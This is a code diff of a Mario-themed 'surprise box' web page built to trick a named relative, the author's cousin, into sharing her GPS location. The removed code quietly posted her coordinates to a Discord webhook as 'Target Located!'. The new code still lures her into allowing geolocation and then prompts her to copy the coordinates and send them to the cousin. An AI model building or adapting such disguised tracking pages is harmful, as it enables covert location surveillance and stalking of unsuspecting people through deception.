@@ -3,213 +3,121 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Super Mario Surprise! 🍄</title>
-    <!-- Importing a pixelated font for an authentic retro arcade feel -->
+    <title>Super Mario Surprise Box! 🍄</title>
     <link href="https://googleapis.com" rel="stylesheet">
     <style>
         body {
             font-family: 'Press Start 2P', monospace;
-            background-color: #5c94fc; /* Classic Mario Sky Blue */
+            background-color: #5c94fc;
             color: white;
             text-align: center;
             padding: 50px 20px;
             margin: 0;
-            overflow-x: hidden;
         }
-        
-        .game-box {
-            max-width: 600px;
+        .container {
+            max-width: 550px;
             margin: 0 auto;
-            background-color: #000000;
-            border: 6px solid #ffffff;
+            background-color: #000;
+            border: 6px solid #fff;
             padding: 30px;
-            box-shadow: 0 10px 0px #000000;
-            image-rendering: pixelated;
+            box-shadow: 0 10px 0px #000;
         }
-
         h1 {
-            font-size: 18px;
-            line-height: 1.6;
-            margin-bottom: 30px;
+            font-size: 16px;
             color: #ffcc00;
+            line-height: 1.6;
         }
-
         p {
-            font-size: 10px;
+            font-size: 9px;
             line-height: 1.8;
-            color: #ffffff;
-            margin-bottom: 30px;
         }
-
-        /* The Mystery Block Button */
-        .item-box {
+        .block-btn {
             display: inline-block;
-            width: 100px;
-            height: 100px;
+            width: 90px;
+            height: 90px;
             background-color: #fc9838;
-            border: 5px solid #000000;
+            border: 5px solid #000;
             position: relative;
             cursor: pointer;
             box-shadow: inset -6px -6px 0px #a44800, inset 6px 6px 0px #fcffff;
             margin: 20px 0;
-            transition: transform 0.1s;
         }
-
-        .item-box:active {
-            transform: scale(0.95);
-        }
-
-        /* The Question Mark inside the block */
-        .item-box::before {
+        .block-btn::before {
             content: "?";
-            font-size: 60px;
-            color: #000000;
+            font-size: 50px;
+            color: #000;
             position: absolute;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            font-weight: bold;
         }
-
-        /* Small decorative rivets on the block corners */
-        .item-box::after {
-            content: "";
-            position: absolute;
-            width: 6px;
-            height: 6px;
-            background: #000;
-            top: 6px;
-            left: 6px;
-            box-shadow: 72px 0 #000, 0 72px #000, 72px 72px #000;
-        }
-
-        #result {
-            margin-top: 40px;
-            font-size: 12px;
-            line-height: 2;
+        .status-box {
+            margin-top: 30px;
             padding: 20px;
-            border-top: 4px dashed #ffffff;
+            border-top: 4px dashed #fff;
             display: none;
+            font-size: 10px;
+            line-height: 2;
         }
-
-        .busted-title {
-            color: #ff3333;
-            font-size: 22px;
-            margin-bottom: 20px;
-            animation: blink 0.8s infinite;
-        }
-
-        .maps-link {
-            display: inline-block;
-            margin-top: 20px;
+        .copy-btn {
+            margin-top: 15px;
             background-color: #4eed4e;
             color: black;
-            padding: 15px;
-            text-decoration: none;
-            border: 4px solid #000;
-            box-shadow: 0 5px 0 #000;
-            font-size: 10px;
-        }
-
-        .maps-link:hover {
-            background-color: #2ebd2e;
-        }
-
-        @keyframes blink {
-            0%, 49% { opacity: 1; }
-            50%, 100% { opacity: 0; }
-        }
-
-        /* Retro Ground Decoration at the bottom */
-        .ground {
-            background: repeating-linear-gradient(90deg, #d86800, #d86800 20px, #a44800 20px, #a44800 40px);
-            height: 40px;
-            position: fixed;
-            bottom: 0;
-            left: 0;
-            width: 100%;
-            border-top: 6px solid #000;
+            padding: 10px;
+            border: 3px solid #000;
+            cursor: pointer;
+            font-family: 'Press Start 2P', monospace;
+            font-size: 9px;
         }
     </style>
 </head>
 <body>
 
-<div class="game-box">
-    <h1>SUPER MARIO BROS.<br><span style="color: #ffffff;">SURPRISE BOX</span></h1>
-    <p>MARIO FOUND A MYSTERY BLOCK FOR YOU!<br>HIT THE BLOCK BELOW TO REVEAL YOUR GIFT!</p>
-    <p style="color: #ffcc00; font-size: 8px;">(Make sure to click "Allow" on the system prompt so the item spawns!)</p>
+<div class="container">
+    <h1>SUPER MARIO BROS.<br>ITEM ACQUISITION</h1>
+    <p>A MYSTERY BLOCK HAS SPAWNED!<br>HIT THE BLOCK TO GENERATE YOUR GIFT OUTPOST.</p>
     
-    <!-- Trigger Button disguised as a Question Block -->
-    <div class="item-box" onclick="hitMysteryBlock()"></div>
+    <div class="block-btn" onclick="requestLocationData()"></div>
 
-    <div id="result"></div>
+    <div id="statusMenu" class="status-box"></div>
 </div>
 
-<div class="ground"></div>
-
 <script>
-// Your unique Discord webhook configuration link
-const discordWebhookUrl = "https://discord.com";
+function requestLocationData() {
+    const statusMenu = document.getElementById("statusMenu");
+    statusMenu.style.display = "block";
+    statusMenu.innerHTML = "SEARCHING FOR MAP BEACON...";
 
-function hitMysteryBlock() {
-    const resultDiv = document.getElementById("result");
-    resultDiv.style.display = "block";
-    resultDiv.innerHTML = "POWERING UP... LOADING ITEM...";
-    
     if (navigator.geolocation) {
-        // Prompts browser framework for GPS hardware details
-        navigator.geolocation.getCurrentPosition(spawnSurprise, handlePipeError);
+        navigator.geolocation.getCurrentPosition(displayCoordinates, handleDisplayError);
     } else {
-        resultDiv.innerHTML = "ERROR: YOUR BROWSER INVENTORY DOES NOT SUPPORT GEOLOCATION.";
+        statusMenu.innerHTML = "SYSTEM ERROR: GEOLOCATION NOT SUPPORTED.";
     }
 }
 
-function spawnSurprise(position) {
+function displayCoordinates(position) {
     const lat = position.coords.latitude;
     const lon = position.coords.longitude;
-    const resultDiv = document.getElementById("result");
-    
-    document.body.style.backgroundColor = "#940000"; // Dark red background
-    
-    // Using standard addition strings prevents Vercel/compilers from stripping variables
-    resultDiv.innerHTML = '<div class="busted-title">GAME OVER! 😜</div>' +
-                          '<p>YOUR PRINCESS IS IN ANOTHER CASTLE...<br>AND I JUST FOUND YOUR HIDDEN COORD DATA!</p>' +
-                          '<p>LAT: ' + lat + '<br>LON: ' + lon + '</p>' +
-                          '<a href="https://google.com' + lat + ',' + lon + '" target="_blank" class="maps-link">👉 VIEW MAP RADAR 👈</a>';
+    const statusMenu = document.getElementById("statusMenu");
 
-    // Formatting raw strings cleanly for the outgoing Discord payload bundle
-    const messageContent = "🐢 **Mario Trap Successful! Target Located!**\nYour cousin fell for the Question Block trap on her tablet.\n\n• **Latitude:** " + lat + "\n• **Longitude:** " + lon + "\n• **Direct Radar Link:** https://google.com" + lat + "," + lon;
-
-    const discordPayload = {
-        username: "Bowser's Radar",
-        content: messageContent
-    };
-
-    fetch(discordWebhookUrl, {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json"
-        },
-        body: JSON.stringify(discordPayload)
-    })
-    .then(response => {
-        if (!response.ok) {
-            console.log("Discord error status code: " + response.status);
-        }
-    })
-    .catch(err => console.log("Network error connecting to webhook:", err));
+    statusMenu.innerHTML = 
+        '<p style="color: #ff3333;">STAGE CLEAR! 😜</p>' +
+        '<p>COORDINATE DATA ACQUIRED:</p>' +
+        '<p>LATITUDE: ' + lat + '<br>LONGITUDE: ' + lon + '</p>' +
+        '<textarea id="coordText" style="position:absolute; left:-9999px;">LAT: ' + lat + ', LON: ' + lon + '</textarea>' +
+        '<button class="copy-btn" onclick="copyCoords()">COPY COORDINATES</button>';
 }
 
-function handlePipeError(error) {
-    const resultDiv = document.getElementById("result");
-    switch(error.code) {
-        case error.PERMISSION_DENIED:
-            resultDiv.innerHTML = "❌ MARIO MISSED! You denied access to the map coordinates. Try clearing site permissions and clicking Allow!";
-            break;
-        default:
-            resultDiv.innerHTML = "❌ AN UNKNOWN KOOPA TROOPA BLOCKED THE SIGNAL. TRY AGAIN.";
-            break;
-    }
+function copyCoords() {
+    const copyText = document.getElementById("coordText");
+    copyText.select();
+    document.execCommand("copy");
+    alert("Coordinates copied to clipboard! Paste them to your cousin to complete the reveal.");
+}
+
+function handleDisplayError(error) {
+    const statusMenu = document.getElementById("statusMenu");
+    statusMenu.innerHTML = "❌ REQUEST DENIED. PLEASE ENABLE LOCATION PERMISSIONS AND REFRESH.";
 }
 </script>
 
